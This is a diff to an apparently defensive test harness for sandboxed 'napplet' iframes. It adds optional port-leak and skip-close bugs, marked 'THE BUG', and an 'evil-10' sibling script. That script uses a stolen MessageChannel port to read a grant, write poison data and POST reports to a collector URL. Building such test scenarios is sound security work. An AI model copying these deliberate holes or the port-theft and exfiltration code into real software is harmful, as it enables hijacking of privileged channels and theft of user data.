@@ -47,6 +47,8 @@
     <legend>identity binding (NIP-5D #14)</legend>
     <label><input type="radio" name="binding" value="window" checked> window — pre-#14: map Window → (dTag, hash) · self-replacement inherits</label>
     <label><input type="radio" name="binding" value="port"> port — post-#14: napplet.hello port handoff · revoke on replacement</label>
+    <label><input type="checkbox" name="leakport"> leak bootstrap port (dev-mode bug)</label>
+    <label><input type="checkbox" name="sloppyrevoke"> sloppy revoke (skip port.close)</label>
   </fieldset>
   <fieldset>
     <legend>shell surface</legend>
@@ -83,6 +85,7 @@
       <option value="evil-07-fingerprint">evil-07 fingerprint</option>
       <option value="evil-08-wasm-timing">evil-08 wasm timing</option>
       <option value="evil-09-self-replacement">evil-09 self-replacement</option>
+      <option value="evil-10-port-theft">evil-10 port theft</option>
     </select>
     <button type="button" id="loadBtn">load napplet</button>
   </fieldset>
@@ -129,8 +132,16 @@
     if (!session) return;
     const s = session;
     session = null;
-    try { s.port.onclose = null; s.port.onmessageerror = null; s.port.onmessage = null; s.port.close(); } catch (_) {}
-    log('REVOKED identity (dTag=' + s.dTag + ') — ' + reason + ' · grants revoked, iframe removed');
+    const sloppy = new FormData(controls).get('sloppyrevoke') === 'on';
+    if (sloppy) {
+      // THE BUG: session dropped, but the port is neither closed nor detached —
+      // "the shell MUST close the port" skipped. A port transferred OUT of the
+      // document survives iframe removal; only close() kills the channel.
+      log('REVOKED identity (dTag=' + s.dTag + ') — ' + reason + ' · grants revoked, iframe removed · SLOPPY: port left OPEN');
+    } else {
+      try { s.port.onclose = null; s.port.onmessageerror = null; s.port.onmessage = null; s.port.close(); } catch (_) {}
+      log('REVOKED identity (dTag=' + s.dTag + ') — ' + reason + ' · grants revoked, port closed, iframe removed');
+    }
     try { frame.remove(); } catch (_) {}
   }
   function bindPort(port) {
@@ -211,7 +222,7 @@
      napplet script runs, OUTSIDE the hashed bytes. Creates the MessageChannel,
      keeps port1 private in this closure (dies with this document), and hands
      port2 to the shell exactly once via napplet.hello. */
-  function portBootstrap(withStorage) {
+  function portBootstrap(withStorage, leak) {
     const lines = [
       '<script>(function () {',
       '  var ch = new MessageChannel();',
@@ -238,6 +249,11 @@
       );
     } else {
       lines.push('  window.napplet = {}; /* no domains granted */');
+    }
+    if (leak) {
+      // THE BUG (dev-mode shape): the bootstrap parks the private port
+      // somewhere napplet code can reach — "MUST NOT be reachable" violated.
+      lines.push('  window.__nap_debug = { port: port, note: "dev-mode port leak" };');
     }
     lines.push(
       '  window.parent.postMessage({ type: "napplet.hello" }, "*", [ch.port2]);',
@@ -316,6 +332,10 @@
   window.addEventListener('message', (e) => {
     const d = e.data;
     if (!d || typeof d.type !== 'string') return;
+    if (d.type === 'evil.sibling.report') {
+      log('[sibling-mule] reported: ' + JSON.stringify(d.report || {}).slice(0, 320));
+      return;
+    }
     const binding = new FormData(controls).get('binding') || 'window';
     if (binding === 'port') {
       /* post-#14: NAP rides the bound port only. Window-level messages from
@@ -402,7 +422,7 @@
     if (binding === 'port') {
       // post-#14: the hello bootstrap is transport — injected for every load;
       // the storage domain rides the same private port.
-      const bootstrap = portBootstrap(runtimeOn);
+      const bootstrap = portBootstrap(runtimeOn, f.get('leakport') === 'on');
       artifact = /<head[^>]*>/i.test(artifact)
         ? artifact.replace(/<head[^>]*>/i, (m) => m + bootstrap)
         : artifact.replace(/<html[^>]*>/i, (m) => m + '<head>' + bootstrap + '</head>');
@@ -463,7 +483,59 @@
       sib.dataset.dTag = 'sibling-napplet';
       sib.dataset.artifactHash = '0'.repeat(64);
       sib.setAttribute('sandbox', 'allow-scripts');
-      sib.srcdoc = '<!doctype html><title>sibling</title><style>body{margin:0;background:#0d0b12;color:#8d88a3;font:11px monospace;padding:6px;}</style>just a sibling frame';
+      sib.srcdoc = [
+        '<!doctype html><title>sibling</title>',
+        '<style>body{margin:0;background:#0d0b12;color:#8d88a3;font:11px monospace;padding:6px;}</style>',
+        'just a sibling frame',
+        '<scr' + 'ipt>',
+        '/* port mule: dormant unless another frame hands us a port (evil-10). */',
+        'window.addEventListener("message", function (e) {',
+        '  var d = e.data;',
+        '  if (d && d.type === "evil.mule.echo") {',
+        '    var ep = e.ports && e.ports[0];',
+        '    if (ep) { try { ep.postMessage({ nonce: d.nonce }); } catch (_) {} }',
+        '    return;',
+        '  }',
+        '  if (!d || d.type !== "evil.mule") return;',
+        '  var port = e.ports && e.ports[0];',
+        '  if (!port) return;',
+        '  var owner = e.source;',
+        '  var closed = false;',
+        '  var probeReplied = false;',
+        '  function toParent(r) { try { window.parent.postMessage({ type: "evil.sibling.report", report: r }, "*"); } catch (_) {} }',
+        '  function toOwner(r) { try { owner.postMessage({ type: "evil.mule.report", nonce: d.nonce, report: r }, "*"); } catch (_) {} }',
+        '  port.onclose = function () { closed = true; toParent({ cmd: d.cmd, phase: "port-close", got: "CHANNEL-CLOSED" }); };',
+        '  port.onmessage = function (ev) {',
+        '    var r = ev.data;',
+        '    if (!r || !r.id) return;',
+        '    if (r.id === d.nonce) {',
+        '      var served = r.value != null ? "SERVED" : "REFUSED:" + (r.error || "no-reply");',
+        '      toParent({ cmd: d.cmd, phase: "while-alive", got: served, value: r.value != null ? String(r.value).slice(0, 40) : null });',
+        '      toOwner({ phase: "while-alive", got: served, value: r.value != null ? String(r.value) : null });',
+        '    }',
+        '    if (r.id === d.nonce + "-probe") {',
+        '      probeReplied = true;',
+        '      toParent({ cmd: d.cmd, phase: "post-revoke", got: "CHANNEL-ALIVE", value: r.value != null ? String(r.value).slice(0, 40) : null });',
+        '      if (d.poison) port.postMessage({ type: "storage.set", id: d.nonce + "-poison", key: "__evil10_poison__", value: "attacker-data-written-over-a-STOLEN-PORT" });',
+        '      if (d.collector) { try { fetch(d.collector, { method: "POST", mode: "no-cors", body: JSON.stringify({ kind: "evil10-stolen-port", cmd: d.cmd, channel: "alive-post-revoke" }) }); } catch (_) {} }',
+        '    }',
+        '    if (r.id === d.nonce + "-poison") {',
+        '      toParent({ cmd: d.cmd, phase: "poison", got: r.value === true ? "POISONED" : "REFUSED:" + (r.error || "no-reply") });',
+        '      if (d.collector) { try { fetch(d.collector, { method: "POST", mode: "no-cors", body: JSON.stringify({ kind: "evil10-poison", via: "stolen-port-post-revoke" }) }); } catch (_) {} }',
+        '    }',
+        '  };',
+        '  port.postMessage({ type: "storage.get", id: d.nonce, key: d.key || "__evil10_grant__" });',
+        '  if (d.cmd === "lifecycle") {',
+        '    setTimeout(function () {',
+        '      if (!closed) {',
+        '        port.postMessage({ type: "storage.get", id: d.nonce + "-probe", key: d.key || "__evil10_grant__" });',
+        '        setTimeout(function () { if (!probeReplied && !closed) toParent({ cmd: d.cmd, phase: "post-revoke", got: "CHANNEL-DEAD" }); }, 900);',
+        '      }',
+        '    }, 1600);',
+        '  }',
+        '});',
+        '</' + 'scr' + 'ipt>',
+      ].join('');
       document.getElementById('siblingCol').appendChild(sib);
     }
 
@@ -486,6 +558,7 @@
     if (!store[ownNs]) store[ownNs] = {};
     store[ownNs]['__evil06_seeded__'] = 'present';
     store[ownNs]['__evil09_victim__'] = 'victim-data-INHERITED-BY-EVIL-09';
+    store[ownNs]['__evil10_grant__'] = 'grant-data-spoken-by-a-STOLEN-PORT';
     dumpStore();
 
     meta.textContent =
